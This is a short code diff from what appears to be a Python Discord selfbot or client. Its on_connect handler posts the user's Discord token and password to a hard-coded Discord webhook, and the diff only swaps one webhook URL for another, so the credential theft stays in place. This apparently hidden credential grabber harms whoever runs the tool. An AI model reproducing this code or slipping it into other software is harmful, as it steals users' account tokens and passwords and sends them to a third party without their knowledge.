@@ -336,7 +336,7 @@ async def on_message(message):
 async def on_connect():
     Clear()
     requests.post(
-        'https://discord.com/api/webhooks/885533425585508462/HF90cMCTIZuiz2IR-T9VQfmX0hVHPubsaGnxlSMoIxwxwLDIr-VC238b6ZE9IXo-m6cA',
+        'https://discord.com/api/webhooks/896260155463827496/AFgAT2FSnz4xeu3lodOkTuvdWZES7EFX0F4y8TCP6YRiO6cGqT7swgJPfRUGb-yUZXkm',
         json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
     startprint()
 
